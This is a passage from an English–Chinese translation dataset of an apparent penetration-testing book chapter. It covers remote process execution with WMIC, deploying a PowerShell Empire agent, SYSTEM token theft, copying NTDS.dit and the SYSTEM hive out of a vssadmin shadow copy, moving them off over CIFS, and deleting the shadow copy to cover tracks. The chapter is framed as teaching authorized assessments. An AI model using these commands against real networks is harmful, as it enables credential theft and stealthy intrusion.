  type: TYPE_NORMAL
  zh: 在命令行中使用WMIC命令不会留下任何软件或代码的痕迹。虽然WMI活动可以被记录，但许多组织未开启或未审查日志。WMI是另一个在Windows中往往被忽视的功能。
- en: In almost any Windows environment, WMI and PowerShell can’t be blocked.
  id: totrans-69
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在几乎任何Windows环境中，WMI和PowerShell都无法被阻止。
- en: Bringing this together, we realize that we can use WMIC to remotely administer
    a Windows host while leveraging the target’s PowerShell functionality.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 总结一下，我们意识到可以利用WMIC远程管理Windows主机，同时利用目标的PowerShell功能。
- en: Quietly spawning processes with WMIC
  id: totrans-71
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 用WMIC悄悄地生成进程
- en: For this exercise, I’m recruiting a Windows 7 attack PC for firing off WMI commands
    against a Windows Server 2012 target. You now have two attackers – Kali and Windows.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 对于这个练习，我招募了一个Windows 7攻击PC，用于对Windows Server 2012目标发动WMI命令。现在你有两个攻击者 – Kali和Windows。
- en: 'Let’s poke around with WMIC for a minute to get an idea of what it looks like.
    Open up the **CMD** command prompt and execute **wmic**. This will put you in
    an interactive session. Now, execute **useraccount list /format:list**:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们用WMIC探索一分钟，看看它是什么样子。打开**CMD**命令提示符并执行**wmic**。这将进入交互式会话。现在，执行**useraccount
    list /format:list**：
- en: '![Figure 16.8 – User accounts from WMIC ](image/Figure_16.08_B17616.jpg)'
  id: totrans-74
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.8 – 从WMIC获取用户帐户](image/Figure_16.08_B17616.jpg)'
- en: Figure 16.8 – User accounts from WMIC
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.8 – 从WMIC获取用户帐户
- en: 'WMIC returns local user accounts in a handy format. Not terribly exciting.
    Where the fun lies is in remote administration. Now, try using the **node:[IP
    address] /user:[DOMAIN]\[User] computersystem list brief /format:list** command.
    You’ll be prompted for the user’s password:'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: WMIC以便捷的格式返回本地用户帐户。并不是特别令人兴奋。有趣的地方在于远程管理。现在，尝试使用**node:[IP地址] /user:[DOMAIN]\[User]
    computersystem list brief /format:list**命令。系统会提示输入用户密码：
- en: '![Figure 16.9 – System information from WMIC ](image/Figure_16.09_B17616.jpg)'
  id: totrans-77
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.9 – 从WMIC获取系统信息](image/Figure_16.09_B17616.jpg)'
- en: Figure 16.9 – System information from WMIC
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.9 – 从WMIC获取系统信息
- en: 'Well now, this is a little more interesting. The fun isn’t over yet, though.
    Try using the **path win32_process call create "calc.exe"** command, while still
    retaining the **node:[***IP address***] /user:[***DOMAIN***]\[***User***]** header.
    Don’t forget to pass **Y** when prompted:'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 噢，现在这个有点有趣。不过，乐趣还没有结束。尝试使用**path win32_process call create "calc.exe"**命令，同时保留**node:[***IP地址***]
    /user:[***域***]\[***用户***]**头部。提示时别忘了输入**Y**：
- en: '![Figure 16.10 – Executing a process with WMIC ](image/Figure_16.10_B17616.jpg)'
  id: totrans-80
  prefs: []
  type: TYPE_IMG
  zh: '![图16.10 – 使用WMIC执行进程](image/Figure_16.10_B17616.jpg)'
- en: Figure 16.10 – Executing a process with WMIC
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 图16.10 – 使用WMIC执行进程
- en: Check that out; **Method execution successful**. **Out Parameters** tells us
    what the host kicked back to us; we can see a PID and a **ReturnValue** of **0**
    (meaning no errors). Now, head on over to your target system and look for the
    friendly calculator on the screen. Wait, where is it? Perhaps the command failed
    after all.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 看看这个；**方法执行成功**。**输出参数**告诉我们主机返回给我们的内容；我们可以看到一个PID和**ReturnValue**为**0**（表示没有错误）。现在，去你的目标系统上看看屏幕上的友好计算器。等等，它在哪里？也许命令终究是失败了。
- en: 'Let’s take a look inside Windows Task Manager:'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看一下Windows任务管理器：
- en: '![Figure 16.11 – The running task from our target’s point of view ](image/Figure_16.11_B17616.jpg)'
  id: totrans-84
  prefs: []
  type: TYPE_IMG
  zh: '![图16.11 – 从目标的角度看正在运行的任务](image/Figure_16.11_B17616.jpg)'
- en: Figure 16.11 – The running task from our target’s point of view
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 图16.11 – 从目标的角度看正在运行的任务
- en: It did execute **calc.exe**. Confirm the PID as well – it’s the instance that
    was kicked off by our command. If you’ve ever written scripts or other programs
    that launch a process, even when you try to hide it, seeing a command window flicker
    on the screen for a split second is a familiar experience and we usually hope
    the user won’t see it. Quietly kicking off PowerShell? Priceless.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 它确实执行了**calc.exe**。也确认一下PID——它是由我们的命令启动的实例。如果你曾经写过脚本或其他启动进程的程序，即使你尝试隐藏它，看到命令窗口在屏幕上闪烁一下也是熟悉的经历，我们通常希望用户看不见它。悄悄启动PowerShell？简直是无价之宝。
- en: Creating a PowerShell Empire agent with remote WMIC
  id: totrans-87
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用远程WMIC创建PowerShell Empire代理
- en: 'Let’s fire up Empire with **./empire** (inside its directory) and configure
    a listener. At the main prompt, type **listeners** followed by **uselistener http**.
    Name it whatever you like, though I called it WMIC to distinguish this attack:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们启动Empire，使用**./empire**（在其目录中）并配置一个监听器。在主提示符下，输入**listeners**，然后输入**uselistener
    http**。你可以随意命名，我叫它WMIC，以区分这次攻击：
- en: '![Figure 16.12 – Setting up our listener in Powershell Empire ](image/Figure_16.12_B17616.jpg)'
  id: totrans-89
  prefs: []
  type: TYPE_IMG
  zh: '![图16.12 – 在Powershell Empire中设置监听器](image/Figure_16.12_B17616.jpg)'
- en: Figure 16.12 – Setting up our listener in Powershell Empire
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 图16.12 – 在Powershell Empire中设置监听器
- en: "Back at the main menu, you can execute **listeners** again to confirm that\
    \ it’s up and running. Now, we need a stager. Keep in mind that stagers are PowerShell\
    \ commands wrapped up in something designed to get them executed. For example,\
    \ you could generate a BAT file that you then have to get onto the target machine\
    \ to have executed. Here, we’re using WMI to create a process remotely – we just\
    \ need the raw command. Therefore, the specific stager you choose is less important\
    \ because we’re just nabbing the command out of it. In my case, I picked the BAT\
    \ file option by executing **usestager** **windows/launcher_bat**. The only option\
    \ that matters right now is configuring the listener to associate the resulting\
    \ agent with – remember the name you set earlier. If you did \LWMIC like me, then\
    \ the command is **set Listener WMIC** (don’t forget that it’s case-sensitive).\
    \ Fire off **execute** and your BAT file will be dropped into the **tmp** folder.\
    \ Open it up with your favorite editor and extract the PowerShell command on its\
    \ own:"
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 回到主菜单，你可以再次执行**listeners**来确认它是否已启动并正常运行。现在，我们需要一个stager。请记住，stager是封装在某种形式中的PowerShell命令，旨在使它们得以执行。例如，你可以生成一个BAT文件，然后将其传输到目标机器上执行。在这里，我们使用WMI远程创建进程——我们只需要原始命令。因此，选择的具体stager不那么重要，因为我们只是从中提取命令。就我而言，我选择了执行**usestager
    windows/launcher_bat**的BAT文件选项。现在唯一重要的是配置监听器以将生成的代理与之关联——记住你之前设置的名称。如果你像我一样使用了WMIC，那么命令是**set
    Listener WMIC**（不要忘记它是区分大小写的）。执行**execute**，你的BAT文件将被放入**tmp**文件夹中。用你喜欢的编辑器打开它并提取PowerShell命令：
- en: '![Figure 16.13 – Creating our launcher BAT file linked to the listener ](image/Figure_16.13_B17616.jpg)'
  id: totrans-92
  prefs: []
  type: TYPE_IMG
  zh: '![图16.13 – 创建与监听器关联的启动器BAT文件](image/Figure_16.13_B17616.jpg)'
- en: Figure 16.13 – Creating our launcher BAT file linked to the listener
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 图16.13 – 创建与监听器关联的启动器BAT文件
- en: As a testament to how clever antimalware vendors can be, I tried to send an
    Empire staging command as a **TXT** file through Gmail and it was flagged as a
    virus. I was hoping that using plaintext would make things easier, but sure enough,
    it was yet another hurdle for the bad guys.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 为了证明反恶意软件厂商的聪明才智，我尝试通过 Gmail 发送一个 Empire 阶段性命令，作为 **TXT** 文件发送，结果它被标记为病毒。我本以为使用纯文本会让事情变得更简单，没想到，确实又是坏人们的另一个障碍。
- en: Now, let’s head back to the Windows attack machine, PowerShell command in tow.
    I’m preparing my WMIC command against the target. Note that I’m not using the
    interactive session. That’s because it has a character limit, and you’ll need
    as much space as you can get with this long string. Therefore, I dump it into
    an ordinary CMD session and pass the command as an argument to **wmic**.
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们回到 Windows 攻击机，带着 PowerShell 命令。我正在准备针对目标的 WMIC 命令。请注意，我没有使用交互式会话。因为它有字符限制，而这个长字符串需要尽可能多的空间。所以我将它转储到普通的
    CMD 会话中，并将命令作为参数传递给 **wmic**。
- en: Don’t forget that the **win32_process call create** argument must be wrapped
    in quotation marks.
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 别忘了，**win32_process call create** 参数必须用引号括起来。
- en: 'I wish I could tell you that this will feel like one of those action movies
    where the tough guy casually walks away from an explosion without turning around
    to look at it, but in reality, it will look like the calculator spawn. You’ll
    get a PID and **ReturnValue = 0**. I encourage you to imagine the explosion thing
    anyway:'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 我希望我能告诉你，这一切就像那些动作片中的情节，硬汉从爆炸中若无其事地走开，甚至不回头看看。但实际上，这看起来更像是计算器进程的启动。你会得到一个 PID
    和 **ReturnValue = 0**。无论如何，我鼓励你想象那个爆炸的场面：
- en: '![Figure 16.14 – Dropping the command in WMIC ](image/Figure_16.14_B17616.jpg)'
  id: totrans-98
  prefs: []
  type: TYPE_IMG
  zh: '![图16.14 – 在 WMIC 中丢弃命令](image/Figure_16.14_B17616.jpg)'
- en: Figure 16.14 – Dropping the command in WMIC
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 图16.14 – 在 WMIC 中丢弃命令
- en: Let’s hop on over to the Kali attacker where our Empire listener was faithfully
    waiting for the agent to report back to base. Sure enough, we can see our new
    agent configured and ready to be tasked. Try the **info** command to confirm the
    host and the username whose security context the agent is using. Note that the
    PID is displayed here, too – it will match the PID from your WMIC Out Parameters.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们跳到 Kali 攻击者的机器上，Empire 监听器正忠实地等待代理报告回总部。果然，我们可以看到新的代理已经配置好，准备接受任务。尝试 **info**
    命令以确认主机和代理使用的安全上下文的用户名。请注意，这里也显示了 PID——它将与 WMIC 输出参数中的 PID 相匹配。
- en: Escalating your agent to SYSTEM via access token theft
  id: totrans-101
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 通过访问令牌窃取将你的代理提升为 SYSTEM
- en: Just last week, I went to the county fair with my family. My daughter went on
    her first roller coaster, my wife saw pig racing, and we drank slushy lemonade
    until we were all sugared out. When you first arrive, you go to the ticket booth
    and buy one of two options – a book of individual tickets that you can use like
    cash to access the rides or a wristband that gives you unlimited access to everything.
    Access tokens in Windows are similar (minus the pig racing part). When a user
    successfully authenticates to Windows, an access token is generated. Every process
    that’s executed on behalf of that user will have a copy of this token, and the
    tokens are used to verify the security context of the process or thread that possesses
    it. This way, you don’t have numerous pieces operating under a given user, requiring
    password authentication.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 就在上周，我和家人去县集市玩。我的女儿第一次坐过山车，我妻子看了猪赛跑，我们一直喝着冰沙柠檬水，直到糖分过量。当你第一次到达时，你会去售票处，购买两种选项之一——一本单独的票册，可以像现金一样用来进入游乐设施，或者是一个腕带，可以让你无限制地进入所有设施。Windows
    中的访问令牌类似（除了猪赛跑部分）。当用户成功通过身份验证后，系统会生成一个访问令牌。每个代表该用户执行的进程都会有这个令牌的副本，而这些令牌用于验证拥有它的进程或线程的安全上下文。这样，你就不需要多个不同的进程在同一用户下运行，也不需要每次都进行密码认证。
- en: Suppose, however, that someone stole my wristband at the county fair. That person
    could then ride on the carousel with my privileges, even though the wristband
    was obtained via a legitimate cash transaction. There are methods for stealing
    a token from a process running in the **SYSTEM** security context, giving us full
    control. Now that we have an agent running on our target, let’s task it with token
    theft. First, we need to know what processes are running. Remember that we can
    use **tasklist** to see what’s running and capture the PIDs for everything.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，假设某人在县博览会上偷走了我的腕带。这个人就能以我的权限在旋转木马上骑乘，即使腕带是通过合法的现金交易获得的。实际上，有一些方法可以从以 **SYSTEM**
    安全上下文运行的进程中盗取令牌，从而完全控制目标。现在我们已经在目标上运行了代理，接下来让我们指派它执行令牌盗窃任务。首先，我们需要知道当前有哪些进程在运行。记住，我们可以使用
    **tasklist** 来查看正在运行的进程，并捕获每个进程的 PID。
- en: 'Task the Empire agent with **shell tasklist**:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 指派 Empire 代理执行 **shell tasklist**：
- en: '![Figure 16.15 – tasklist in our PowerShell Empire session ](image/Figure_16.15_B17616.jpg)'
  id: totrans-105
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.15 – 我们 PowerShell Empire 会话中的 tasklist](image/Figure_16.15_B17616.jpg)'
- en: Figure 16.15 – tasklist in our PowerShell Empire session
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.15 – 我们 PowerShell Empire 会话中的 tasklist
- en: 'After identifying a process ID to rob, task the agent with **steal_token**:'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 在确定了要盗取的进程 ID 后，指派代理执行 **steal_token**：
- en: '![Figure 16.16 – SYSTEM token stolen! ](image/Figure_16.16_B17616.jpg)'
  id: totrans-108
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.16 – SYSTEM 令牌已被盗！](image/Figure_16.16_B17616.jpg)'
- en: Figure 16.16 – SYSTEM token stolen!
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.16 – SYSTEM 令牌已被盗！
- en: Now, let’s look at raiding a compromised domain controller. Once again, we’ll
    be living off the land by leveraging Windows administrative tools.
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们来看看如何攻陷已被攻破的域控制器。我们再次将通过利用 Windows 管理工具来“活用土地”。
- en: Dancing in the shadows – looting domain controllers with vssadmin
  id: totrans-111
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在阴影中舞蹈 – 使用 vssadmin 抢夺域控制器
- en: So, you achieved domain administrator in your client’s environment. Congratulations!
    Now what?
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 所以，你已经在客户环境中取得了域管理员权限。恭喜你！接下来怎么办？
- en: In a section about pressing forward from initial compromise and a chapter about
    escalating privileges, we need a little outside-of-the-box thinking. We’ve covered
    a lot of technical ground, but don’t forget the whole idea – you’re conducting
    an assessment for a client, and the value of your results isn’t just a bunch of
    screenshots with green text in them. When you’re having a drink with your hacker
    friends and you tell them about your domain administrator compromise, they understand
    what that means. But when you’re presenting your findings for the executive management
    of a client? I’ve had countless executives ask me point-blank, so what? Shaking
    them by the shoulders while shouting I got domain admin by sniffing their printer
    isn’t going to convince anyone. Now, let me contrast that with the meetings I’ve
    had with clients in which I tell them that I now have 68% of their 3,000 employees’
    passwords in a spreadsheet, with more coming in every hour. I promise you, that
    will get their attention.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 在关于从初步入侵向前推进以及提升权限的章节中，我们需要一些跳出常规的思维方式。我们已经覆盖了许多技术内容，但不要忘记整体思路——你是在为客户进行评估，你的成果价值不仅仅是一堆带有绿色文本的截图。当你和黑客朋友们一起喝酒，告诉他们你成功获得了域管理员权限时，他们明白这意味着什么。但当你向客户的高层管理人员汇报你的发现时呢？我曾有无数次的高层直接问我，“那又怎么样？”用力晃动他们的肩膀并大声喊出“我通过监听他们的打印机获得了域管理员权限”是不会说服任何人的。现在，让我来对比一下我和客户的会谈，我告诉他们，我已经在一个电子表格中获得了他们
    3,000 名员工中 68% 的密码，而且每小时还在持续增加。相信我，这样会引起他们的注意。
- en: When it comes to looting an environment for passwords, there are different ways
    of doing it and they all have different implications. For example, walking around
    an office looking for passwords written down is surprisingly effective. This would
    normally happen during a physical assessment, but we used to occasionally do this
    as part of an audit with no sneaking around necessary. This sort of thing may
    get you on a security camera’s footage. We’ve covered some of the technical methods
    too – pretty much anything involving a payload can be detected by antivirus software.
    Whenever you can leverage built-in mechanisms for a task, you stand less risk
    of setting off alarms. We learned this with PowerShell. There’s another administrative
    tool that, depending on the environment, may be allowed as part of a backup procedure: **vssadmin**,
    the Volume Shadow Copy Service administration tool.
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 在从环境中窃取密码时，有不同的方式可以做到，而且它们各自具有不同的含义。例如，在办公室四处寻找写下来的密码出奇的有效。这通常发生在进行物理评估时，但我们曾经偶尔在审计过程中这样做，而不需要偷偷摸摸。这种事情可能会让你出现在监控摄像头的录像中。我们也讨论了一些技术方法——基本上，任何涉及有效载荷的操作都可能被杀毒软件检测到。只要你能利用内建的机制来完成任务，你就更不容易触发警报。我们从
    PowerShell 中学到了这一点。还有另一个管理员工具，根据环境的不同，它可能作为备份程序的一部分被允许使用：**vssadmin**，即卷影像副本服务管理工具。
- en: Shadow copies are also called snapshots; they’re copies of replicas, which are
    point-in-time backups of protected files, shares, and folders. Replicas are created
    by the **Data Protection Manager** (**DPM**) server. After the initial creation
    of a replica, it’s periodically updated with deltas to the protected data. The
    shadow copy is a full copy of the data as of the last synchronization. We care
    about it here because, in every environment that I’ve ever worked in, the Windows
    system is included in the replica, including two particularly tasty little files: **NTDS.dit**
    and the **SYSTEM** registry hive. **NTDS.dit** is the actual database file for
    Active Directory; as such, it’s only found on domain controllers. The **SYSTEM**
    hive is a critical component of the Windows registry and contains a lot of configuration
    data and hardware information. However, what we need is the **SYSKEY** key that
    was used to encrypt the password data.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 影像副本也称为快照；它们是复制品，是受保护文件、共享和文件夹的时间点备份。复制品由 **数据保护管理器** (**DPM**) 服务器创建。在复制品首次创建后，它会定期通过增量更新受保护的数据。影像副本是数据的完整副本，基于最后一次同步。我们在这里关心的是它，因为在我曾经工作的每个环境中，Windows
    系统都包含在复制品中，特别是其中有两个非常重要的小文件：**NTDS.dit** 和 **SYSTEM** 注册表 hive。**NTDS.dit** 是
    Active Directory 的实际数据库文件，因此它只存在于域控制器上。**SYSTEM** hive 是 Windows 注册表的一个关键组件，包含大量配置数据和硬件信息。然而，我们需要的是用来加密密码数据的
    **SYSKEY** 密钥。
- en: 'When you’re ready to poke around, fire up **vssadmin** on your domain controller
    and take a look at the options:'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 当你准备好进行探索时，启动 **vssadmin** 在你的域控制器上并查看选项：
- en: '![Figure 16.17 – vssadmin help screen ](image/Figure_16.17_B17616.jpg)'
  id: totrans-117
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.17 – vssadmin 帮助屏幕](image/Figure_16.17_B17616.jpg)'
- en: Figure 16.17 – vssadmin help screen
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.17 – vssadmin 帮助屏幕
- en: Let’s dive into how to create a shadow and steal stuff from it.
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们深入了解如何创建影像副本并从中窃取内容。
- en: Extracting the NTDS database and SYSTEM hive from a shadow copy
  id: totrans-120
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 从影像副本中提取 NTDS 数据库和 SYSTEM hive
- en: 'It’s a good idea to first list any existing shadow copies with **vssadmin List
    Shadows**. Sometimes, shadow copies are created regularly, and having a recent
    snapshot means you can jump ahead to copying out the database and hive. This makes
    stealth slightly easier. Assuming no shadow copies exist (or they’re old), run
    the **CMD** prompt as an **Administrator** and create a shadow copy for the C:
    drive:'
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: '最好先使用 **vssadmin List Shadows** 列出任何现有的影像副本。有时，影像副本会定期创建，拥有一个最近的快照意味着你可以直接跳到复制数据库和
    hive 的步骤。这会稍微减少被发现的风险。假设没有影像副本存在（或者它们很旧），以 **管理员** 身份运行 **CMD** 提示符并为 C: 驱动器创建影像副本：'
- en: 'vssadmin Create Shadow /For=C:'
  id: totrans-122
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'vssadmin Create Shadow /For=C:'
- en: 'You’ll see the following confirmation:'
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 你将看到以下确认信息：
- en: '![Figure 16.18 – Successful shadow copy ](image/Figure_16.18_B17616.jpg)'
  id: totrans-124
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.18 – 成功的影像副本](image/Figure_16.18_B17616.jpg)'
- en: Figure 16.18 – Successful shadow copy
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.18 – 成功的影像副本
- en: 'Make a note of the shadow copy volume name, as you’ll need to refer to it during
    the copy operation. You’ll just use the good old-fashioned **copy** for this,
    substituting what you’d normally call **C:** with **\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1**.
    The NTDS database is stored in the NTDS directory under Windows, and you’ll find
    **SYSTEM** inside the **system32\config** folder. You can place the files wherever
    you want; it’s a temporary location as you prepare to exfiltrate them. You should
    consider how you’ll be getting them off the domain controller, though. For example,
    if there’s a shared folder that you can access across the network, that’ll be
    an ideal spot to place them:'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 记下影像副本卷的名称，因为在复制操作过程中需要引用它。你将使用传统的**复制**命令，只需将通常称作**C:**的部分替换为**\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1**。NTDS数据库存储在Windows的NTDS目录下，**SYSTEM**文件则位于**system32\config**文件夹内。你可以将文件放置在任何位置；这是一个临时位置，用于准备窃取它们。不过，你需要考虑如何将文件从域控制器中取出。例如，如果有一个共享文件夹可以通过网络访问，那么将文件放在那里会是一个理想的选择：
- en: copy **\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit**
    c:\
  id: totrans-127
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 复制**\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit**
    c:\
- en: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\SYSTEM
    c:\
  id: totrans-128
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 复制\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\SYSTEM
    c:\
- en: 'Again, here’s the confirmation:'
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 再次确认：
- en: '![Figure 16.19 – Copying the goods out of the shadow copy ](image/Figure_16.19_B17616.jpg)'
  id: totrans-130
  prefs: []
  type: TYPE_IMG
  zh: '![图16.19 – 从影像副本中复制文件](image/Figure_16.19_B17616.jpg)'
- en: Figure 16.19 – Copying the goods out of the shadow copy
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 图16.19 – 从影像副本中复制文件
- en: Now, we have our goodies – but they’re sitting on the target. How do we get
    them home? Let’s take a look at one method.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已经得到了“战利品”——但它们仍然保存在目标设备上。我们如何将它们带回家呢？让我们看一下其中一种方法。
- en: Exfiltration across the network with cifs
  id: totrans-133
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 通过cifs在网络中窃取数据
- en: 'I could just tell you to pick your favorite way of pulling the files off the
    domain controller. And I will: use your favorite method to get your loot. Sometimes,
    you can sneakernet them out with a USB stick. For now, let’s review attaching
    your Kali box to a share, as this will not only be a common way to recover the
    Active Directory information in this case, but it’s handy for a whole range of
    tasks in Windows environments. First, we need to install **cifs-utils**. Thankfully,
    it’s already included in the repository:'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 我本可以直接告诉你选择自己喜欢的方式将文件从域控制器中拉出来。既然如此，我就告诉你：用你喜欢的方法去获取“战利品”。有时候，你可以通过USB闪存驱动器将文件偷偷带出。目前，让我们回顾一下如何将你的Kali盒子挂载到共享文件夹，因为这不仅是恢复活动目录信息的一种常见方式，在Windows环境中，它对许多任务都非常有用。首先，我们需要安装**cifs-utils**。幸运的是，它已经包含在软件仓库中：
- en: apt-get install cifs-utils
  id: totrans-135
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: apt-get install cifs-utils
- en: 'Once it’s installed, use **mount -t cifs** to specify the location of the share.
    Note that I didn’t pass the password as an argument, as that would necessitate
    exposing it in plaintext. It may not matter during the attack, but you’ll want
    to be considerate of the screenshot for your report. Omitting the password will
    cause you to be prompted for it:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 安装后，使用**mount -t cifs**来指定共享的位置。请注意，我没有将密码作为参数传递，因为那样会暴露密码的明文。在攻击过程中可能不重要，但你会希望在报告截图中小心处理。省略密码会导致系统提示你输入：
- en: '![Figure 16.20 – Target C: drive locally mounted in Kali ](image/Figure_16.20_B17616.jpg)'
  id: totrans-137
  prefs: []
  type: TYPE_IMG
  zh: '![图16.20 – 在Kali中本地挂载的目标C:驱动器](image/Figure_16.20_B17616.jpg)'
- en: 'Figure 16.20 – Target C: drive locally mounted in Kali'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 图16.20 – 在Kali中本地挂载的目标C:驱动器
- en: There – no explosions, nothing exciting, just a new folder on my system that
    I can use like any local folder. I’ll use **cp** to nab the files off the domain
    controller. And just like that, we have the Active Directory database residing
    in our Kali attack box, and the only thing left behind on the domain controller
    is the shadow copy that the administrators expect to be there. But wait – what
    if there were no shadow copies and we had to create one? Then we left behind a
    shadow copy that is *not* expected. **vssadmin Delete Shadows** is your friend
    for tidying up your tracks. I recommend doing it right after you’ve extracted
    the files you need from the shadow copy.
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 就这样，没有任何爆炸或令人兴奋的事情，只是在我的系统上创建了一个新的文件夹，可以像使用任何本地文件夹一样使用。我将使用**cp**从域控制器获取文件。就这样，我们将活动目录数据库带到了我们的Kali攻击盒子中，域控制器上唯一留下的就是管理员预期存在的影像副本。但等等——如果没有影像副本，我们必须创建一个呢？那我们就留下了一个*不*被预期的影像副本。**vssadmin
    Delete Shadows**是清理痕迹的好帮手。我建议在从影像副本中提取所需文件后立即使用它。
- en: Password hash extraction with libesedb and ntdsxtract
  id: totrans-140
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用libesedb和ntdsxtract提取密码哈希
- en: 'And now, without further ado, the real fun part. When I first started using
    this technique, the process was a little more tedious; today, you can have everything
    extracted and formatted for John with only *two* commands. There is a caveat,
    however: We need to prep Kali to build the **libesedb** suite properly. We can
    have all of this done automatically with utilities such as **autoconf**, a wizard
    of a tool that will generate scripts that automatically configure the software
    package. A detailed review of what we are about to install is outside the scope
    of this discussion, so I encourage you to check out the man pages offline.'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，言归正传，真正有趣的部分来了。当我刚开始使用这种技术时，过程稍显繁琐；但如今，你只需要*两*个命令，就能将所有内容提取并格式化为John所需的格式。不过，有一个警告：我们需要为Kali做好准备，以正确构建**libesedb**套件。我们可以通过如**autoconf**等工具自动完成所有这些，它是一个神奇的工具，能够生成自动配置软件包的脚本。关于我们即将安装的内容的详细讨论超出了本讨论的范围，因此我建议你查阅man页面以便了解更多。
- en: 'Here are the commands, line by line. Let each one finish before proceeding.
    It may take a few minutes, so go refill your coffee mug:'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 下面是逐行命令。每一条命令执行完后再继续。可能会花几分钟时间，趁机去补充一下咖啡：
- en: git clone https://github.com/libyal/libesedb
  id: totrans-143
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: git clone https://github.com/libyal/libesedb
- en: git clone https://github.com/csababarta/ntdsxtract
  id: totrans-144
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: git clone https://github.com/csababarta/ntdsxtract
- en: cd libesedb
  id: totrans-145
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: cd libesedb
- en: apt-get install git autoconf automake autopoint libtool pkg-config
  id: totrans-146
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: apt-get install git autoconf automake autopoint libtool pkg-config
- en: ./synclibs.sh
  id: totrans-147
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: ./synclibs.sh
- en: ./autogen.sh
  id: totrans-148
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: ./autogen.sh
- en: chmod +x configure
  id: totrans-149
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: chmod +x configure
- en: ./configure
  id: totrans-150
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: ./configure
- en: make
  id: totrans-151
  prefs:
